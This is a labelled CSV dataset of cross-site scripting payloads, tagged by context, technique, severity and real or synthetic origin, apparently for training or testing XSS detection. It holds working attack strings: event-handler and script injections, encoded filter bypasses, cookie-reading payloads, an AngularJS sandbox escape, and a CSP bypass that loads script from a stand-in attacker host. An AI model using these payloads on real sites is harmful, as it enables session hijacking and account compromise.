payload,context,technique,severity,length,source
<svg onerror=alert(1)>,tag_injection,synthetic,medium,22,synthetic
"<style>:target {color:red;}</style><basefont id=x style=""transition:color 1s"" ontransitionend=alert(1)></basefont>",event_handler,none,medium,114,real
"eval(""alert(document.cookie)"")",dom_sink,synthetic,medium,30,synthetic
<svG oNmoUseOveR=cOnsOle.loG(dOcuMenT.dOmaIn)/>,tag_injection,synthetic,medium,47,synthetic
"<script onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</script>",script_injection,none,medium,70,real
<dl onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</dl><input value=clickme>,event_handler,none,medium,104,real
"<isindex onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</isindex>",event_handler,none,medium,67,real
"<listing oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</listing>",event_handler,none,medium,66,real
<output onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,68,real
"<style>:target {color:red;}</style><slot id=x style=""transition:color 1s"" ontransitionstart=alert(1)></slot>",event_handler,none,medium,108,real
"<a2 onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</a2>",event_handler,none,medium,65,real
"document.write(""%3Cimg src=x onerror=alert('XSS')%3E"")",dom_sink,synthetic,medium,54,synthetic
<dialog onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</dialog><input value=clickme>,event_handler,none,medium,103,real
"<strong draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</strong>",event_handler,none,medium,70,real
' onmouseenter=confirm(1) ',attribute_escape,synthetic,medium,27,synthetic
<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>,event_handler,none,medium,169,real
"<listing oncontextmenu=""alert(1)"">AnonKryptiQuz</listing>",event_handler,none,medium,57,real
'-alert(1)-',generic,none,medium,12,real
<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>,script_injection,none,medium,84,real
"<object onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></object>",event_handler,none,medium,285,real
"<command onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</command>",event_handler,none,medium,72,real
"<details/open=/Open/href=/data=;+ontoggle=""(alert)(document.domain)",event_handler,none,low,67,real
<svg onlo&#97;d=consol&#101;.log(docum&#101;nt.cooki&#101;)>,tag_injection,synthetic,medium,60,synthetic
"""><svg onmous&#101;&#101;nt&#101;r=consol&#101;.log('XSS')>",tag_injection,synthetic,medium,59,synthetic
&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&apos;XSS&apos;);&quot;&gt;,js_uri,none,medium,74,real
<head onblur=alert(1) tabindex=1 id=x></head><input autofocus>,event_handler,none,medium,62,real
"""`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>",script_injection,none,medium,52,real
"<caption draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</caption>",event_handler,none,medium,87,real
<animatemotion onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,64,real
"&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;",js_uri,encoding,medium,63,real
%3Csvg ontoggle=confirm(1)/%3E,tag_injection,synthetic,medium,30,synthetic
"<br onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</br>",event_handler,none,medium,59,real
"<frame onmouseenter=""alert(1)"">AnonKryptiQuz</frame>",event_handler,none,medium,52,real
"<frame onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></frame>",event_handler,none,medium,283,real
<embed onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
"<spacer onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</spacer>",event_handler,none,medium,67,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rp id=x style=""position:absolute;"" onanimationcancel=""print()""></rp>",event_handler,none,low,173,real
<script>//prompt(document.domain)</script>,script_injection,synthetic,medium,42,synthetic
"<style>@keyframes x{}</style><map style=""animation-name:x"" onanimationend=""alert(1)""></map>",event_handler,none,medium,91,real
"<main onmousemove=""alert(1)"">AnonKryptiQuz</main>",event_handler,none,medium,49,real
"<div draggable=""true"" contenteditable>drag me</div><select ondrop=alert(1) contenteditable style=display:block>drop here</select>",event_handler,none,medium,129,real
"<form oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</form>",event_handler,none,medium,71,real
"<nav onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</nav>",event_handler,none,medium,64,real
"<source oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</source>",event_handler,none,medium,75,real
%3Cscript%3Ealert`location.hash`%3C/script%3E,script_injection,synthetic,medium,45,synthetic
"<input draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</input>",event_handler,none,medium,68,real
"<rt onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</rt>",event_handler,none,medium,65,real
<script>/x/confirm(location.hash)</script>,script_injection,synthetic,medium,42,synthetic
"<video2 onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</video2>",event_handler,none,medium,71,real
"<img \x12src=x onerror=""javascript:alert(0960)"">",event_handler,none,medium,48,real
"<style>:target {color:red;}</style><data id=x style=""transition:color 1s"" ontransitionstart=alert(1)></data>",event_handler,none,medium,108,real
<BODY BACKGROUND=�javascript:alert(�AnonKryptiQuz�)�>,js_uri,case_variation,medium,53,real
"""><svg onfocus=confirm(docum&#101;nt.dom&#97;in)>",tag_injection,synthetic,medium,49,synthetic
<d3v/onmouseleave=[2].some(confirm)>click,event_handler,none,low,41,real
<button popovertarget=x>Click me</button><b onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</b>,event_handler,none,medium,98,real
"<object oncut=""alert(1)"" contenteditable>AnonKryptiQuz</object>",event_handler,none,medium,63,real
<p><img/src/onerror=alert(`AnonKryptiQuz`)></p>,event_handler,none,medium,47,real
<input onblur=write(XSS) autofocus><input autofocus>,event_handler,none,low,52,real
"<div onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</div>",event_handler,none,medium,59,real
"<output onmousedown=""alert(1)"">AnonKryptiQuz</output>",event_handler,none,medium,53,real
"<keygen onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</keygen>",event_handler,none,medium,68,real
<svG oNfoCus=coNfiRm(LocAtiOn.HasH)/>,tag_injection,synthetic,medium,37,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><p id=x style=""position:absolute;"" onanimationcancel=""print()""></p>",event_handler,none,low,171,real
"<b oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</b>",event_handler,none,medium,54,real
' oNmoUseEntEr=AleRt(DocUmeNt.DomAin) ',attribute_escape,synthetic,medium,39,synthetic
"' onclick=console.log(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,medium,54,synthetic
"<meter onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</meter>",event_handler,none,medium,68,real
嘼svg><script>a<!>l<!>e<!>r<!>t<!>(<!>1<!>)</script>,script_injection,none,low,51,real
"<mark oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</mark>",event_handler,none,medium,60,real
"<td onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</td>",event_handler,none,medium,61,real
<svg id=x tabindex=1 onbeforedeactivate=alert(1)></svg><input autofocus>,event_handler,none,medium,72,real
"<blockquote draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</blockquote>",event_handler,none,medium,96,real
"<? foo=""><x foo='?><script>alert(91)</script>'>"">",script_injection,none,medium,49,real
""" onmous&#101;ov&#101;r=consol&#101;.log(loc&#97;tion.h&#97;sh) """,attribute_escape,synthetic,medium,65,synthetic
""" onfocus=\u0061lert(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,medium,53,synthetic
"<style>@keyframes x{}</style><legend style=""animation-name:x"" onwebkitanimationend=""alert(1)""></legend>",event_handler,none,medium,103,real
"<style>@keyframes slidein {}</style><colgroup style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></colgroup>",event_handler,none,medium,170,real
"javascript://--></title></style></textarea></script><svg ""//' onclick=alert()//",event_handler,none,medium,79,real
"<div draggable=""true"" contenteditable>drag me</div><article ondrop=alert(1) contenteditable>drop here</article>",event_handler,none,medium,111,real
"<bdi draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</bdi>",event_handler,none,medium,59,real
"<cite onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</cite>",event_handler,none,medium,84,real
<scr	ipt>/x/confirm(document.cookie)</scr	ipt>,script_injection,synthetic,medium,46,synthetic
"<rtc onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</rtc>",event_handler,none,medium,64,real
"<LINK REL=""stylesheet"" HREF=""javascript:alert('AnonKryptiQuz');"">",js_uri,case_variation,medium,65,real
"<tr id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></tr>",event_handler,none,medium,80,real
"<button onmouseout=""alert(1)"">AnonKryptiQuz</button>",event_handler,none,medium,52,real
"<img src=x onerror=""eval('\x61lert(1)')""/>",event_handler,encoding,high,42,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><blockquote id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></blockquote>",event_handler,none,medium,190,real
"<meta onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</meta>",event_handler,none,medium,83,real
<svg onlo&#97;d=confirm('XSS')>,tag_injection,synthetic,medium,31,synthetic
"""><svg onb&#101;gin=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,67,synthetic
<img id=x tabindex=1 onfocusin=alert(1)></img>,event_handler,none,medium,46,real
"<object onbeforeload object onbeforeload=""javascript:javascript:alert(1)""></object onbeforeload>",event_handler,none,medium,96,real
"<div draggable=""true"" contenteditable>drag me</div><ins ondrop=alert(1) contenteditable style=display:block>drop here</ins>",event_handler,none,medium,123,real
<embed onpointermove=alert(1) style=display:block>AnonKryptiQuz</embed>,event_handler,none,medium,71,real
"<summary draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</summary>",event_handler,none,medium,72,real
"<thead ondblclick=""alert(1)"">AnonKryptiQuz</thead>",event_handler,none,medium,50,real
"<style>@keyframes x{}</style><element style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></element>",event_handler,none,medium,107,real
<img onerror=a&#108ert(1) src=a>,event_handler,html_entity,low,32,real
"<style>@keyframes x{}</style><html style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></html>",event_handler,none,medium,101,real
"""><svg onmouseover=alert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,56,synthetic
j&NewLine;a&NewLine;vas&NewLine;cript:confirm(1);,generic,none,medium,49,real
<nobr id=x tabindex=1 onfocus=alert(1)></nobr>,event_handler,none,medium,46,real
"throw onerror=eval,SyntaxError`alert\x2823\x29`",event_handler,none,low,47,real
<track onpointerleave=alert(1) style=display:block>AnonKryptiQuz</track>,event_handler,none,medium,72,real
<svG oNmoUseOveR=cOnsOle.loG('XSS')>,tag_injection,synthetic,medium,36,synthetic
' onbegin=alert(1) ',attribute_escape,synthetic,medium,20,synthetic
"<time oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,97,real
"<div draggable=""true"" contenteditable>drag me</div><image ondragover=alert(1) contenteditable>drop here</image>",event_handler,none,medium,111,real
%22%3E%3Cimg%20src=x%20onerror=confirm%281%29;%3E,event_handler,url_encoding,low,49,real
"""><svg onmouseover=prompt(1)>",tag_injection,synthetic,medium,29,synthetic
%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003ealert('AnonKryptiQuz')%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e,generic,none,medium,124,real
"<figcaption onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</figcaption>",event_handler,none,medium,81,real
<svg onclick=\u0061lert(1)/>,tag_injection,synthetic,medium,28,synthetic
"<base onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</base>",event_handler,none,medium,66,real
"<div id=""43""><?xml version=""1.0"" standalone=""no""?>",event_handler,none,low,50,real
"""><Svg onLoaD=aLerT(STriNg.FroMChArCOde(88,83,83))>",tag_injection,synthetic,medium,51,synthetic
%3Csvg onerror=confirm(1)%3E,tag_injection,synthetic,medium,28,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><colgroup id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></colgroup>",event_handler,none,medium,186,real
%27 onfocus=console.log(1) %27,attribute_escape,synthetic,medium,30,synthetic
"<style>:target {transform: rotate(180deg);}</style><del id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></del>",event_handler,none,medium,124,real
"<noembed onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</noembed>",event_handler,none,medium,72,real
document.location='java\rscript:alert(1)',dom_sink,none,medium,41,real
"<basefont oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</basefont>",event_handler,none,medium,68,real
<progress id=x tabindex=1 onfocusin=alert(1)></progress>,event_handler,none,medium,56,real
"<svg onclick=confirm(String.fromCharCode(88,83,83))/>",tag_injection,synthetic,medium,53,synthetic
"{{c='%27%27.sub.call;b='%27%27.sub.bind;a='%27%27.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync(""astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?voide:(window.X=true,alert(document.domain)))+';astNode.argument={type:'Identifier',name:'foo'};"");m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a='%27%27.sub;$eval('a(b.c)'):[].push.apply=a:}}",template_injection,encoding|url_encoding,high,538,real
<script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+test=new+MouseEvent(); test.isTrusted=true; test.type='click';  document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click(test); </script>,script_injection,url_encoding,medium,277,real
"<a href=""\x14javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
<applet onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,68,real
"<li onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</li>",event_handler,none,medium,66,real
<wbr onpointerover=alert(1) style=display:block>AnonKryptiQuz</wbr>,event_handler,none,medium,67,real
"<style>:target {color: red;}</style><html id=x style=""transition:color 10s"" ontransitioncancel=print()></html>",event_handler,none,low,110,real
"<strong draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</strong>",event_handler,none,medium,89,real
"<spacer id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></spacer>",event_handler,none,medium,88,real
"<rtc draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</rtc>",event_handler,none,medium,84,real
"<style>:target {color:red;}</style><dfn id=x style=""transition:color 1s"" ontransitionend=alert(1)></dfn>",event_handler,none,medium,104,real
"<dfn onmouseleave=""alert(1)"">AnonKryptiQuz</dfn>",event_handler,none,medium,48,real
<body onpointerleave=alert(1) style=display:block>AnonKryptiQuz</body>,event_handler,none,medium,70,real
"<article onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</article>",event_handler,none,medium,75,real
<sup onpointerdown=alert(1) style=display:block>AnonKryptiQuz</sup>,event_handler,none,medium,67,real
"<spacer onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</spacer>",event_handler,none,medium,85,real
"<noframes onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</noframes>",event_handler,none,medium,77,real
eval(%22alert(%27XSS%27)%22),dom_sink,synthetic,medium,28,synthetic
<video2 onpointerdown=alert(1) style=display:block>AnonKryptiQuz</video2>,event_handler,none,medium,73,real
"eval(""alert(location.hash)"")",dom_sink,synthetic,medium,28,synthetic
""" on&#101;rror=&#97;l&#101;rt(docum&#101;nt.cooki&#101;) """,attribute_escape,synthetic,medium,58,synthetic
<h1 onpointerover=alert(1) style=display:block>AnonKryptiQuz</h1>,event_handler,none,medium,65,real
"<element ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</element>",event_handler,none,medium,95,real
"<content onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</content>",event_handler,none,medium,72,real
"<style>@keyframes slidein {}</style><q style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></q>",event_handler,none,medium,162,real
"<address onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</address>",event_handler,none,medium,75,real
"<style>:target {color:red;}</style><rtc id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></rtc>",event_handler,none,medium,110,real
<svg onlo&#97;d=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)/>,tag_injection,synthetic,medium,58,synthetic
<legend onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57,real
"<div draggable=""true"" contenteditable>drag me</div><q ondragover=alert(1) contenteditable style=display:block>drop here</q>",event_handler,none,medium,123,real
"<listing onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</listing>",event_handler,none,medium,89,real
<colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>,event_handler,none,medium,70,real
"<time draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</time>",event_handler,none,medium,66,real
<command onpointerenter=alert(1) style=display:block>AnonKryptiQuz</command>,event_handler,none,medium,76,real
"<code onmouseout=""alert(1)"">AnonKryptiQuz</code>",event_handler,none,medium,48,real
"<tt onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</tt>",event_handler,none,medium,80,real
"<figcaption draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</figcaption>",event_handler,none,medium,78,real
"<center oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</center>",event_handler,none,medium,75,real
"""><svg onload=alert(document.domain)>",tag_injection,synthetic,medium,37,synthetic
"”&gt;&lt;svg onload=alert&amp;#0000000040""1"")&gt;",event_handler,none,low,49,real
<menu onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</menu><input value=clickme>,event_handler,none,medium,108,real
"<form onmouseleave=""alert(1)"">AnonKryptiQuz</form>",event_handler,none,medium,50,real
<svg onb&#101;gin=consol&#101;.log('XSS')>,tag_injection,synthetic,medium,42,synthetic
"<fieldset oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,102,real
<svg><image href=validimage.png onload=alert(1)>,event_handler,none,medium,48,real
<svG oNtoGglE=cOnsOle.loG(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,41,synthetic
"http://example.lab/csp.php?xss=f=document.createElement%28""iframe""%29;f.id=""pwn"";f.src=""/robots.txt"";f.onload=%28%29=>%7Bx=document.createElement%28%27script%27%29;x.src=%27//remoteattacker.lab/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;",event_handler,url_encoding,high,291,real
"<noscript><p title=""</noscript><img src=x onerror=([,O,B,J,E,C,,]=[]+{},[T,R,U,E,F,A,L,S,,,N]=[!!O]+!O+B.E)[X=C+O+N+S+T+R+U+C+T+O+R][X](A+L+E+R+T+(document.cookie))()>"">",event_handler,none,high,169,real
"<option draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</option>",event_handler,none,medium,70,real
"<style>@keyframes slidein {}</style><audio2 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></audio2>",event_handler,none,medium,172,real
"<STYLE>li {list-style-image: url(""javascript:javascript:alert(1)"");}</STYLE><UL><LI>AnonKryptiQuz",js_uri,case_variation,medium,97,real
<svg onb&#101;gin=prompt(1)/>,tag_injection,synthetic,medium,29,synthetic
""" oNmoUseOveR=aLerT(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape,synthetic,medium,52,synthetic
"<figcaption onmouseenter=""alert(1)"">AnonKryptiQuz</figcaption>",event_handler,none,medium,62,real
<legend id=x tabindex=1 onactivate=alert(1)></legend>,event_handler,none,medium,53,real
"<figure onclick=""alert(1)"" style=display:block>AnonKryptiQuz</figure>",event_handler,none,medium,69,real
<IMG SRC=”jav&#x09;ascript:alert(‘XSS’);”>,tag_injection,html_entity|whitespace_obfuscation|case_variation,medium,42,real
"<?a foo=x=`y><img alt=""`><img src=xx:x onerror=alert(3)//"">//[""'`-->]]>]</div>",event_handler,none,medium,78,real
"<meter onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</meter>",event_handler,none,medium,70,real
<frameset onblur=alert(1) tabindex=1 id=x></frameset><input autofocus>,event_handler,none,medium,70,real
"<iframe src=""vbscript:document.vulnerable=true;"">",tag_injection,none,low,49,real
"<style>:target {transform: rotate(180deg);}</style><i id=x style=""transition:transform 2s"" ontransitionrun=print()></i>",event_handler,none,low,119,real
<script>document.vulnerable=true;</script>,script_injection,none,low,42,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><head id=x style=""position:absolute;"" onanimationcancel=""print()""></head>",event_handler,none,low,177,real
"<blockquote onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</blockquote>",event_handler,none,medium,81,real
"<svg></p><style><g title=""</style><img src onerror=alert(document.domain)>"">",event_handler,none,medium,76,real
"<input2 onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</input2>",event_handler,none,medium,85,real
<dfn onblur=alert(1) tabindex=1 id=x></dfn><input autofocus>,event_handler,none,medium,60,real
"<tfoot oncut=""alert(1)"" contenteditable>AnonKryptiQuz</tfoot>",event_handler,none,medium,61,real
"<ins onmouseleave=""alert(1)"">AnonKryptiQuz</ins>",event_handler,none,medium,48,real
"""><Svg onErrOr=ProMpt(1)>",tag_injection,synthetic,medium,25,synthetic
element[attribute='<img src=x onerror=alert('XSS');>,event_handler,none,medium,52,real
%22 onfocus=prompt(location.hash) %22,attribute_escape,synthetic,medium,37,synthetic
"<center oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</center>",event_handler,none,medium,64,real
<svg%0Ao%00nload=%09((pro\u006dpt))()//,tag_injection,unicode_escape|url_encoding,low,39,real
"<area draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</area>",event_handler,none,medium,66,real
"<area draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</area>",event_handler,none,medium,86,real
"<mark onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</mark>",event_handler,none,medium,69,real
"<b oncontextmenu=""alert(1)"">AnonKryptiQuz</b>",event_handler,none,medium,45,real
"<tt draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</tt>",event_handler,none,medium,62,real
""" onmouseenter=console.log(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,medium,59,synthetic
<svg onmouseenter=prompt('XSS')/>,tag_injection,synthetic,medium,33,synthetic
javascript&#x003A;alert(1),generic,html_entity,medium,26,real
"<a""/onclick=(confirm)()>elcezeri!",event_handler,none,low,33,real
<legend onpointerdown=alert(1) style=display:block>AnonKryptiQuz</legend>,event_handler,none,medium,73,real
<dialog onblur=alert(1) tabindex=1 id=x></dialog><input autofocus>,event_handler,none,medium,66,real
<script>location=name</script>,script_injection,none,low,30,real
<svg onb&#101;gin=prompt(docum&#101;nt.dom&#97;in)/>,tag_injection,synthetic,medium,52,synthetic
"<style>:target {color: red;}</style><button id=x style=""transition:color 10s"" ontransitioncancel=print()></button>",event_handler,none,low,114,real
"""`'><script>\xE2\x80\x88javascript:alert(1)</script>",script_injection,none,medium,52,real
"<div draggable=""true"" contenteditable>drag me</div><applet ondragover=alert(1) contenteditable>drop here</applet>",event_handler,none,medium,113,real
<svg contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,57,real
"<del onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</del>",event_handler,none,medium,59,real
<image2 onpointerleave=alert(1) style=display:block>AnonKryptiQuz</image2>,event_handler,none,medium,74,real
<svg id=alert(1) onload=eval(id)>,event_handler,encoding,high,33,real
"javascript:/*`//'//\""//</style></noscript></script>--></textarea></noembed></template></title><script>/<frame <svg""///*/ onload=alert()//</script>",script_injection,comment_injection,medium,146,real
%22><svg onbegin=confirm(location.hash)>,tag_injection,synthetic,medium,40,synthetic
"<style>@keyframes slidein {}</style><ul style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ul>",event_handler,none,medium,158,real
""" onbegin=prompt(1) """,attribute_escape,synthetic,medium,21,synthetic
"<base onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</base>",event_handler,none,medium,61,real
"<iframe src=mhtml:http://html5sec.org/AnonKryptiQuz.gif!xss.html></iframe>//[""'`-->]]>]</div>",tag_injection,none,low,93,real
<noscript onblur=alert(1) tabindex=1 id=x></noscript><input autofocus>,event_handler,none,medium,70,real
"<blockquote draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</blockquote>",event_handler,none,medium,78,real
<button popovertarget=x>Click me</button><blink onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</blink>,event_handler,none,medium,106,real
"<ins draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</ins>",event_handler,none,medium,79,real
%22 onbegin=alert(document.cookie) %22,attribute_escape,synthetic,medium,38,synthetic
"<em onmousedown=""alert(1)"">AnonKryptiQuz</em>",event_handler,none,medium,45,real
<button popovertarget=x>Click me</button><td ontoggle=alert(1) popover id=x>AnonKryptiQuz</td>,event_handler,none,medium,94,real
<svG oNclIck=coNfiRm('XSS')>,tag_injection,synthetic,medium,28,synthetic
<font style='color:expression(alert(document.cookie))'>,dom_sink,none,high,55,real
"<small draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</small>",event_handler,none,medium,87,real
<scRipT>aLerT(dOcuMenT.cOokIe)</sCriPt>,script_injection,synthetic,medium,39,synthetic
<figure onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</figure><input value=clickme>,event_handler,none,medium,103,real
<font onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54,real
<b contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,55,real
<plaintext onpointerup=alert(1) style=display:block>AnonKryptiQuz</plaintext>,event_handler,none,medium,77,real
"""><img src=x onerror=prompt&#x000000028;document&#x00000002E;domain&#x000000029;&#x00000003B;>",event_handler,html_entity,low,94,real
"<meta style=""xss:expression(open(alert(1)))"" />",attribute_escape,none,medium,47,real
<svg onclick=consol&#101;.log(1)/>,tag_injection,synthetic,medium,34,synthetic
